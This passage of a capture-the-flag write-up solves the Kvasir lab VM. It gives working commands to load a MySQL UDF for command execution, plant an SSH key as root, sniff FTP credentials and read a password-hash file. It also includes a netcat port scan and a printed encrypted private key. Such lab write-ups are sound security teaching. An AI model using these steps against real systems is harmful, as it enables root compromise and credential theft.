+CREATE FUNCTION BASE64_ENCODE (input BLOB)
+RETURNS BLOB
+CONTAINS SQL
+DETERMINISTIC
+SQL SECURITY INVOKER
+BEGIN
+DECLARE ret BLOB DEFAULT '';
+DECLARE done TINYINT DEFAULT 0;
+
+IF input IS NULL THEN
+RETURN NULL;
+END IF;
+
+each_block:
+WHILE NOT done DO BEGIN
+DECLARE accum_value BIGINT UNSIGNED DEFAULT 0;
+DECLARE in_count TINYINT DEFAULT 0;
+DECLARE out_count TINYINT;
+
+each_input_char:
+WHILE in_count &lt; 3 DO BEGIN
+DECLARE first_char CHAR(1);
+
+IF LENGTH(input) = 0 THEN
+SET done = 1;
+SET accum_value = accum_value &lt;&lt; (8 * (3 - in_count));
+LEAVE each_input_char;
+END IF;
+
+SET first_char = SUBSTRING(input,1,1);
+SET input = SUBSTRING(input,2);
+
+SET accum_value = (accum_value &lt;&lt; 8) + ASCII(first_char);
+
+SET in_count = in_count + 1;
+END; END WHILE;
+
+-- We've now accumulated 24 bits; deaccumulate into base64 characters
+
+-- We have to work from the left, so use the third byte position and shift left
+CASE
+WHEN in_count = 3 THEN SET out_count = 4;
+WHEN in_count = 2 THEN SET out_count = 3;
+WHEN in_count = 1 THEN SET out_count = 2;
+ELSE RETURN ret;
+END CASE;
+
+WHILE out_count &gt; 0 DO BEGIN
+BEGIN
+DECLARE out_char CHAR(1);
+DECLARE base64_getval CURSOR FOR SELECT c FROM base64_data WHERE val = (accum_value &gt;&gt; 18);
+
+OPEN base64_getval;
+FETCH base64_getval INTO out_char;
+CLOSE base64_getval;
+
+SET ret = CONCAT(ret,out_char);
+SET out_count = out_count - 1;
+SET accum_value = accum_value &lt;&lt; 6 &amp; 0xffffff;
+END;
+END; END WHILE;
+
+CASE
+WHEN in_count = 2 THEN SET ret = CONCAT(ret,'=');
+WHEN in_count = 1 THEN SET ret = CONCAT(ret,'==');
+ELSE BEGIN END;
+END CASE;
+
+END; END WHILE;
+
+RETURN ret;
+END |
+</code></pre>
+
+<ul>
+<li><p>Download 64 bit version of the <a href="https://github.com/sqlmapproject/sqlmap/tree/master/udf/mysql/linux">UDF library</a> and run <code>base64</code> through it (32 bit version returns: &lsquo;wrong ELF class: ELFCLASS32&rsquo;).</p></li>
+<li><p>Insert base64 value into the table</p></li>
+</ul>
+
+
+<pre><code>mysql&gt; insert into pwn(test) values ("f0VMRgEBAQAAAAAAAAAAAAMAAwABAAAAwAgAADQAAACoJAAAA (...)");
+</code></pre>
+
+<ul>
+<li>generate binary</li>
+</ul>
+
+
+<pre><code>mysql&gt; select base64_decode(test) from pentest into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys.so';
+</code></pre>
+
+<ul>
+<li>add the following functions</li>
+</ul>
+
+
+<pre><code>DROP FUNCTION IF EXISTS lib_mysqludf_sys_info;
+DROP FUNCTION IF EXISTS sys_get;
+DROP FUNCTION IF EXISTS sys_set;
+DROP FUNCTION IF EXISTS sys_exec;
+DROP FUNCTION IF EXISTS sys_eval;
+
+CREATE FUNCTION lib_mysqludf_sys_info RETURNS string SONAME 'lib_mysqludf_sys.so';
+CREATE FUNCTION sys_get RETURNS string SONAME 'lib_mysqludf_sys.so';
+CREATE FUNCTION sys_set RETURNS int SONAME 'lib_mysqludf_sys.so';
+CREATE FUNCTION sys_exec RETURNS int SONAME 'lib_mysqludf_sys.so';
+CREATE FUNCTION sys_eval RETURNS string SONAME 'lib_mysqludf_sys.so';
+</code></pre>
+
+<p><em>We really only need sys_eval</em></p>
+
+<ul>
+<li>generate keys on Kali and add public key to <code>/root/.ssh/authorized_keys</code> on the database server:</li>
+</ul>
+
+
+<pre><code>mysql&gt; select sys_eval('echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqtaI+mJb7hYALi8qoSXi8wntkC4QuNyFNWLfDzNC1GxeU+pZHz9BCTqFKwzqYLC3Z4CcD3y8I7KsCrBEgFVJaW9OWCoZHeiSnoDOorv/9C8uk7CRZ1jM9AVE7fsuL6rOUHuEFbSgCDLnbo5SFntQSX7UqHDOnn6glhVf+zn58tYf8wMSdH+Is/oAVrJ0G7h7fKNvbIDkVysiBZeZQrMZ3KG5CVq/FzgnSg+WD14YsRVtlcI1irfAdR3MCl4SgGXohAOEvX6mrcMcbe8lvxGRzcJ/T6fe/dHmZUdhZll3ABSHRLYERFqXOtH7veGeZD/PyLXEDzvW0iJUPape2EYrB root@kali" &gt; /root/.ssh/authorized_keys');
+</code></pre>
+
+<ul>
+<li>set right permissions</li>
+</ul>
+
+
+<pre><code>mysql&gt; select sys_eval('chmod 600 /root/.ssh/authorized_keys');
+</code></pre>
+
+<p>And now we should be able to SSH in as root.</p>
+
+<pre><code>root@kali:~# proxychains ssh root@192.168.2.200
+ProxyChains-3.1 (http://proxychains.sf.net)
+|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-192.168.2.200:22-&lt;&gt;&lt;&gt;-OK
+Linux db 3.2.0-4-amd64 #1 SMP Debian 3.2.60-1+deb7u3 x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Tue Nov  4 20:26:44 2014 from 192.168.2.100
+root@db:~#
+</code></pre>
+
+<p>Woooooo! That&rsquo;s not the final root though&hellip;</p>
+
+<pre><code>root@db:~# cat flag 
+This is not the flag you're looking for... :p
+</code></pre>
+
+<h2>FTP? Sniff! Sniff!</h2>
+
+<p>After a bit of poking around, we can get some potentially useful information - some dictionary&hellip;</p>
+
+<pre><code>root@db:~# head .words.txt 
+borne
+precombatting
+noncandescent
+cushat
+lushness
+
+(...truncated...)
+</code></pre>
+
+<p>Hostnames and IP addresses&hellip;</p>
+
+<pre><code>root@db:~# cat /etc/hosts
+# 192.168.3.40  celes
+# 192.168.3.50  terra
+
+127.0.0.1   localhost
+::1     localhost ip6-localhost ip6-loopback
+fe00::0     ip6-localnet
+ff00::0     ip6-mcastprefix
+ff02::1     ip6-allnodes
+ff02::2     ip6-allrouters
+</code></pre>
+
+<p>Find out that it&rsquo;s dual homed&hellip; again!</p>
+
+<pre><code>root@db:~# ifconfig
+eth0      Link encap:Ethernet  HWaddr fe:57:f7:0e:e1:98  
+          inet addr:192.168.2.200  Bcast:192.168.2.255  Mask:255.255.255.0
+          inet6 addr: fe80::fc57:f7ff:fe0e:e198/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:69773 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:55386 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:5835676 (5.5 MiB)  TX bytes:9220761 (8.7 MiB)
+
+eth1      Link encap:Ethernet  HWaddr 86:b5:59:44:80:fb  
+          inet addr:192.168.3.200  Bcast:192.168.3.255  Mask:255.255.255.0
+          inet6 addr: fe80::84b5:59ff:fe44:80fb/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:106899 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:91488 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:15188636 (14.4 MiB)  TX bytes:8176191 (7.7 MiB)
+
+(...)
+</code></pre>
+
+<p>And we can also see that there&rsquo;s FTP service enabled.</p>
+
+<pre><code>root@db:~# netstat -ant
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State      
+tcp        0      0 192.168.2.200:3306      0.0.0.0:*               LISTEN     
+tcp        0      0 0.0.0.0:21              0.0.0.0:*               LISTEN     
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
+tcp        0      0 192.168.2.200:22        192.168.2.100:43133     ESTABLISHED
+tcp        0      0 192.168.3.200:21214     192.168.3.40:45888      TIME_WAIT  
+tcp        0      0 192.168.3.200:58695     192.168.3.50:22         ESTABLISHED
+tcp        0    320 192.168.2.200:22        192.168.2.100:43595     ESTABLISHED
+tcp6       0      0 :::21                   :::*                    LISTEN     
+tcp6       0      0 :::22                   :::*                    LISTEN     
+
+(...some more poking around...)
+
+root@db:~# cat /etc/pure-ftpd/pureftpd.passwd 
+celes:$1$LwZNkFH0$8rq4AbiYLXkfSMPXB1psV/:1000:1000::/var/log/./::::::::::::
+</code></pre>
+
+<p>Unfortunately I didn&rsquo;t seem to be able to crack this password using a dictionary. That got me stuck a bit.
+Sometimes you need to take a step back and ask yourself a question &ldquo;what&rsquo;s insecure about&hellip; FTP?&rdquo;. Of course! It&rsquo;s plaintext!</p>
+
+<p>Let&rsquo;s assume (and hope) there are &lsquo;users&rsquo; on the system, so let&rsquo;s try to sniff some traffic!</p>
+
+<pre><code>root@db:~# tcpdump -i eth1 -vv -x 'port 21' -w ftp-sniff.pcap
+tcpdump: listening on eth1, link-type EN10MB (Ethernet), capture size 65535 bytes
+^C21 packets captured
+21 packets received by filter
+0 packets dropped by kernel
+</code></pre>
+
+<p>Woohoo, there are some packets! Further investigation into them reveals the following username:password combination <code>celes:im22BF4HXn01</code>.</p>
+
+<h2>Stego</h2>
+
+<p>Let&rsquo;s hope celes is a user of very average security awarness and reuses his passwords everywhere&hellip; let&rsquo;s try to SSH using these credentials.</p>
+
+<pre><code>root@db:~# ssh celes@192.168.3.40
+celes@192.168.3.40's password: 
+Linux dev1 3.2.0-4-amd64 #1 SMP Debian 3.2.60-1+deb7u3 x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+You have mail.
+Last login: Fri Oct 24 10:35:02 2014 from 192.168.3.200
+celes@dev1:~$ 
+</code></pre>
+
+<p>And we&rsquo;re in. A bit of poking around and can&rsquo;t see anything really interesting except an image file <code>kvasir.png</code>. Let&rsquo;s download it (<code>scp</code> all the way back) and see what can we get out of it.</p>
+
+<p><img src="/images/posts/2014-11-05-kvasir-vm-writeup/kvasir.png" title="Kvasir" alt="Kvasir" /></p>
+
+<p>Also <code>strings</code> didn&rsquo;t reveal anything interesting about the file. But looking at <code>.bash_history</code> on celes, we can see a clue.</p>
+
+<pre><code>celes@dev1:~$ cat .bash_history 
+stepic --help
+</code></pre>
+
+<p>Aha, must be some kind of stego! I have quickly downloaded <code>stepic</code> and run on <code>kvasir.png</code>.</p>
+
+<pre><code>root@kali:~/data/scripts/stepic-0.3# ./stepic -d -i ~/data/boot2root/kvasir/kvasir.png 
+89504e470d0a1a0a0000000d494844520000012200000122010300000067704df500000006504c5445ffffff00000055c2d37e00000104494441540899ed98c90dc32010459152804b72eb2ec9054422304bc089655f180ec9fb0730f07cfa9a0552420821f43fcaa6674aeb5e96dbe23b1b5434a58be559bf1e59befa03a848aa5ab22de690f2d530a8895473086a365500e7a1265132b5b3bbfc05358e7a57640b919bba0d358eeab55c9c418da7cc0df1a576a2792fa561ad035434a5920b808588d974e215d4584acff4065626ffe9db47a8e194eec805a00d7621830aa6acffd40c95d5a6fa27d404cae555e13475410550e6cca113ed72145424a56ee8ab4f8989ecb5196a02d5bdfa2477e83333410553d97ba093cc04154c89a439ba880ea881944c2d3aea0a6a0e75acc8528c4550e1144208a15fd70b88df9bb4ae0a3dc20000000049454e44ae426082
+</code></pre>
+
+<p>Hmm, alright&hellip; that looks like some hex output&hellip; let&rsquo;s run it through <code>xxd</code></p>
+
+<pre><code>root@kali:~/data/scripts/stepic-0.3# echo "89504e470d0a1a0a0000000d494844520000012200000122010300000067704df500000006504c5445ffffff00000055c2d37e00000104494441540899ed98c90dc32010459152804b72eb2ec9054422304bc089655f180ec9fb0730f07cfa9a0552420821f43fcaa6674aeb5e96dbe23b1b5434a58be559bf1e59befa03a848aa5ab22de690f2d530a8895473086a365500e7a1265132b5b3bbfc05358e7a57640b919bba0d358eeab55c9c418da7cc0df1a576a2792fa561ad035434a5920b808588d974e215d4584acff4065626ffe9db47a8e194eec805a00d7621830aa6acffd40c95d5a6fa27d404cae555e13475410550e6cca113ed72145424a56ee8ab4f8989ecb5196a02d5bdfa2477e83333410553d97ba093cc04154c89a439ba880ea881944c2d3aea0a6a0e75acc8528c4550e1144208a15fd70b88df9bb4ae0a3dc20000000049454e44ae426082" | xxd -p -r &gt; out
+root@kali:~/data/scripts/stepic-0.3# file out 
+out: PNG image data, 290 x 290, 1-bit colormap, non-interlaced
+</code></pre>
+
+<p>Another image file! It&rsquo;s actually a QR code.</p>
+
+<p><img src="/images/posts/2014-11-05-kvasir-vm-writeup/qr.png" title="QR" alt="QR" /></p>
+
+<p>I passed it on to <a href="http://www.onlinebarcodereader.com/">Online Barcode Reader</a> and got the following text <code>Nk9yY31hva8q</code>. Not sure what it&rsquo;s for, may be some kind of password, let&rsquo;s hold on to it for now.</p>
+
+<h2>Solving anagrams</h2>
+
+<p>Having poked around a bit more on <code>celes</code>, I couldn&rsquo;t find anything interesting and it wasn&rsquo;t dual homed. One thing we haven&rsquo;t looked at yet is the other server - <code>terra</code> (192.168.3.50).</p>
+
+<p>Since we&rsquo;re looking at 192.168.3.0 subnet, that means that we would need to double-pivot from our Kali to do a port scan. While I tried that with metasploit, it was failing pretty badly (meterpreters kept crashing). We could put nmap on db server, but meh, I&rsquo;ve crafted my own, very simple portscanner.</p>
+
+<pre><code>root@db:~# for i in {1..65535}; do nc -z 192.168.3.50 $i; if [ $? -eq 0 ]; then echo "Port $i listening" &gt;&gt; results; fi; done
+root@db:~# cat results 
+Port 4444 listening
+</code></pre>
+
+<p>Awesome, let&rsquo;s see what it is.</p>
+
+<pre><code>root@db:~# nc 192.168.3.50 4444
+Hello Celes &amp; Welcome to the Jumble!
+
+Solve:ogsdioclpe 
+Solve:oagichrlogp 
+Solve:snelrgiermo ^C
+</code></pre>
+
+<p>Solving jumbles&hellip; great. I tried couple typical buffer overflow things etc., but none of them worked. I guess we&rsquo;ll need to script up anagram solver.</p>
+
+<p>Also, which dictionary should we use&hellip; after a bit of playing around with that jumble it seemed like there were couple known usernames from #vulnhub. And remember that words.txt file we looted earlier on? It was exactly it! Let&rsquo;s us that and code it all up.</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="err">!</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">python</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kn">import</span> <span class="nn">socket</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">dictionary</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">wordlist</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">words</span><span class="o">.</span><span class="n">txt</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">r</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">Open</span> <span class="n">socket</span> <span class="ow">and</span> <span class="n">retrieve</span> <span class="n">welcome</span> <span class="n">message</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+</span><span class='line'><span class="n">sock</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">3.50</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="mi">4444</span><span class="p">))</span>
+</span><span class='line'><span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">38</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">Keep</span> <span class="n">getting</span> <span class="n">data</span> <span class="n">until</span> <span class="n">socket</span> <span class="n">closes</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+</span><span class='line'>    <span class="c"># Read data from the server</span>
+</span><span class='line'>    <span class="n">data</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">5120</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;</span><span class="c"># Get the word to decode and strip out spaces and new line</span>
+</span><span class='line'><span class="n">phrase</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
+</span><span class='line'><span class="k">print</span> <span class="s">&quot;Phrase = &quot;</span> <span class="o">+</span> <span class="n">phrase</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># Rewind the file back to start</span>
+</span><span class='line'><span class="n">wordlist</span><span class="o">.</span><span class="n">seek</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># Go through each line in the wordlist and try to find a match</span>
+</span><span class='line'><span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">wordlist</span><span class="p">:</span>
+</span><span class='line'>    <span class="n">found_match</span> <span class="o">=</span> <span class="bp">True</span>
+</span><span class='line'>    <span class="n">answer</span> <span class="o">=</span> <span class="s">&quot;n/a&quot;</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="c"># Remove whitespaces and new lines from dictionary word</span>
+</span><span class='line'>    <span class="n">word</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="c"># Start investigating phrase only if it has the same length as selected word from dictionary</span>
+</span><span class='line'>    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">phrase</span><span class="p">)</span> <span class="o">==</span> <span class="nb">len</span><span class="p">(</span><span class="n">word</span><span class="p">):</span>
+</span><span class='line'>        <span class="c"># Go through every letter in the phrase and check number of its occurrences against dictionary word,</span>
+</span><span class='line'>        <span class="c"># if it matches number of occurences of the letter in the phrase, move on to the next letter.</span>
+</span><span class='line'>        <span class="c"># As soon as it fails, don&#39;t bother investigating the word further</span>
+</span><span class='line'>        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">phrase</span><span class="p">)):</span>
+</span><span class='line'>            <span class="k">if</span> <span class="n">phrase</span><span class="o">.</span><span class="n">count</span><span class="p">(</span><span class="n">phrase</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">!=</span> <span class="n">word</span><span class="o">.</span><span class="n">count</span><span class="p">(</span><span class="n">phrase</span><span class="p">[</span><span class="n">i</span><span class="p">]):</span>
+</span><span class='line'>                <span class="n">found_match</span> <span class="o">=</span> <span class="bp">False</span>
+</span><span class='line'>                <span class="k">break</span><span class="p">;</span>
+</span><span class='line'>        <span class="k">if</span> <span class="n">found_match</span><span class="p">:</span>
+</span><span class='line'>            <span class="n">answer</span> <span class="o">=</span> <span class="n">word</span><span class="p">;</span>
+</span><span class='line'>            <span class="k">break</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">print</span> <span class="s">&quot;Answer = &quot;</span> <span class="o">+</span> <span class="n">answer</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># Send answer to the server</span>
+</span><span class='line'><span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">answer</span><span class="p">);</span>
+</span><span class='line'><span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p>It&rsquo;s actually really quick to run and we get another element in the puzzle.</p>
+
+<pre><code>root@db:~# ./anagram-socket.py 
+Phrase = itaingdhs
+Answer = gandhiist
+Phrase = aifieinvuacqotolr
+Answer = overqualification
+Phrase = gorypcueshsry
+Answer = psychosurgery
+
+(...truncated...)
+
+Phrase = iidvaeart
+Answer = radiative
+Phrase = bloiblhimpisi
+Answer = bibliophilism
+Phrase = hvnaci
+Answer = chavin
+Phrase = rabbsrae
+Answer = barrebas
+Phrase = : 120
+Time: 0.02 secs
+You're a winner
+LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpQcm9jLVR5cGU6IDQsRU5DUllQVEVECkRFSy1JbmZvOiBBRVMtMTI4LUNCQyw3Njg0MTgyMkFCOUU3NzJGRDFENjUzRjYxNzlGMEU0RAoKT3JFTTJvY25oSEtnNW51SDdwczFDb09KQ2loYXNtRkpLTE9WTk5ZRk9oR0tVb2pQWUV0YTV5T2hJc2tmMGgwcgpTbyt4VkRLNjdHM0RsZ3ltVVYzRHhHZml6TGZadmh4UVJDOFF5MG1mNE4rbWlZa3ZmMk5hRnRhdHBOY2pLNXBNClV5NlFTRk1PQzhhS3BlMEZMNlVHRFJKUTVHU0c0RGxKckxVSkJNdm5TTHRZWkhsYVdBSUNLYlhmcFhWNFNUd3YKSjBEOGg5UnRsUkpoTENLNWVLZ3VwWUNRSWlHUVdnM1B2WnBYazlra2pYaG1PUXdVWW9DUmwzbDRqNXpsbkZjVApQNlU5VVBoUnEvQ2s0UXJrMmRHeEZmcHBRZDl4VytiNFBXamlTQ2lrTEYzUTBoZk5OdkVidTRvdW5BZ1l3UEZICmpPWEhKcXhWb2cvcFp6OVk4WGZTUDNoejlBWUhXZkkyaUM5Q25rN2JvUmNPdittY2dFZVdXa1lyVnNjT2l2WWoKOU4yeGlOcDRHSCtOSUc4bW0vTGRsN2pRTWwvVnJyNWN4M2ZYak9lem1nc1NrQVk0Q2NzcHdLc1NYSzhHTC9iTwpoVDZwS1dmTDZVSTh3VWdwSTdLaGdLK0FPS3VTL1hQWVRTZHorMFJKeE5GU0xPRk5jalJ0TCtOVzBValBxNUpoCkRpYStwdzVxQitsbGx4Z2FOMFdCUXNrSUZRcHBwUG93d2pHOEpnOGpKQmpTWWozcjRMSXJad0pTcGN2b0JpVUEKb0NxblFVTXRYbE1oOS9DdkJCR3MxK0pWY2prSW5CZGU5NDVWK2VqaFA2R1BZanU0VFFWN0I3MGQ3YUVXME9FbQowZDduck9XL0xDWXBzVi9ONXJxVnNHbFR2d2pKTm93eU1xRVo5RTA5Z3VNNWVMNENFUFBtcDlaRGV5MmZCQUd3CnE3blNyOHE2SHNmNGQrWVBSKzkwRWZNSlJlcUkzczFGUW9UdngrUGFGUGlLdzdkZkhGQ2dMc2NYY1hjb2duTHoKY0IwbG5lbUkrY0ZtZlk3NEYxZVlMM2Z3Skl3U1JnSzg1WGMyTXk4c3FKejFpemo2SWxPMmtRMWpMa3JoSk9aOApYK3AvOXc1ekEweDJmYmpwcEhhYytZb0pmeVB5WVhqa3BpZ0RQakhYaFJpdDJxblVySGZEYzBGamg1QUtOVTJLCk1VL3l3WEdFZzZ3MENwcEs5SkJvMHUveEpsaFQvak9XTmlNNFlaalhsaFF6a3h5ZWJ2YnlSUzZTbGhsbzE0MmwKZ011TVV2UG4xZkFlbmlyNkFGd3kycmxrdFE1L2E4ejJWQ3dQa05BNDBNSW1TSE1XUlNGYm9Eak01endyMjRHawpOMHBJMUJDbUNzZjBtc3ZFd0xoZGNWbmhKWTdCZzRpem01YlgrQXJWL3ltTE9reWJLOGNoejVmcnlYY2plVjFxCml6SmUyQVhaazEvOGhZODB0dkpXanhVRWZuZ3V5b296UWY1VDc0bW41YWV6OUpnR1dNcXpwZkt3WjZMeDVjVGcKWnUrbStyeWFrQlBGalV0dDA0bENZQ0NLV1F6UGhnSXI1eFVGeDYyaENHaGg2Vzh0U0lCNms3SHB1bjEyM0dRMAp1VCtSMEVyWUE1R2R5eDQ0RlpFYXRaM3JYQ3BWbUpsbENUV1VxQnVhSFlBdGNaVGhUVFpmeFJGSHkwMklUNkZXClBMQ1ovWE4yRStUZHRrWG1GY1RYUnNndHlBLzVWWHNUV1dtUmNIY3p2NWc1WWNRM3BIczNNaFN4c1dTZFR6LzgKUll6bXhPbkNqWldYYVVlMFhiN0ZqQS9ldm1wWHN5aENoR2J2cDBLMGhaRmNNZXN6RkthOEs0cEFlZGN5RzMxbgo0K0hoSW1uRXBMWlFPWGhmWGxrS01RWHJCeXM3aGtvbmtEcDU3VnFoK0lJWkxHelZtZlRWRWoyV2hjLzBZK0dJCkRNcGgwWnZURytKZ3YxTE8zU2w4MlJ6bTFqVWt6RUlaTkl4WWVTR3JaZjZDaFZMUGE4NWF4cXc1RVZOQ3hZVWcKSkFxZyt1ZDZ4SU85b2JpZHh6STJyTGZieGNwTXVyODBuYjRjcllNTm0wOXlQUWFza25nSy80SWptblBMZVRpaAotLS0tLUVORCBSU0EgUFJJVkFURSBLRVktLS0tLQo=
+</code></pre>
+
+<p>When we <code>base64 -d</code> the output, we get the following RSA key.</p>
+
+<pre><code>-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,76841822AB9E772FD1D653F6179F0E4D
+
+OrEM2ocnhHKg5nuH7ps1CoOJCihasmFJKLOVNNYFOhGKUojPYEta5yOhIskf0h0r
+So+xVDK67G3DlgymUV3DxGfizLfZvhxQRC8Qy0mf4N+miYkvf2NaFtatpNcjK5pM
+Uy6QSFMOC8aKpe0FL6UGDRJQ5GSG4DlJrLUJBMvnSLtYZHlaWAICKbXfpXV4STwv
+J0D8h9RtlRJhLCK5eKgupYCQIiGQWg3PvZpXk9kkjXhmOQwUYoCRl3l4j5zlnFcT
+P6U9UPhRq/Ck4Qrk2dGxFfppQd9xW+b4PWjiSCikLF3Q0hfNNvEbu4ounAgYwPFH
+jOXHJqxVog/pZz9Y8XfSP3hz9AYHWfI2iC9Cnk7boRcOv+mcgEeWWkYrVscOivYj
+9N2xiNp4GH+NIG8mm/Ldl7jQMl/Vrr5cx3fXjOezmgsSkAY4CcspwKsSXK8GL/bO
+hT6pKWfL6UI8wUgpI7KhgK+AOKuS/XPYTSdz+0RJxNFSLOFNcjRtL+NW0UjPq5Jh
+Dia+pw5qB+lllxgaN0WBQskIFQpppPowwjG8Jg8jJBjSYj3r4LIrZwJSpcvoBiUA
